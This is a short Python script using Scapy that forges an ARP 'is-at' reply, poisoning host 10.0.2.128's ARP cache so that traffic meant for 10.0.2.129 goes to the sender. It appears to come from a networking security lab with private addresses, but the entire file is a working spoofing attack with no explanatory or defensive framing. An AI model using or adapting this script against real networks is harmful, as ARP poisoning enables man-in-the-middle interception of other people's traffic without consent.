#!/usr/bin/python3

from scapy.all import *

a_ip='10.0.2.128'
a_mac='00:0c:29:b6:95:f1'
b_ip='10.0.2.129'

E = Ether(dst=a_mac)
A = ARP(op='is-at', psrc=b_ip, pdst=a_ip, hwdst=a_mac)

pkt = E/A
ls(pkt)
sendp(pkt)
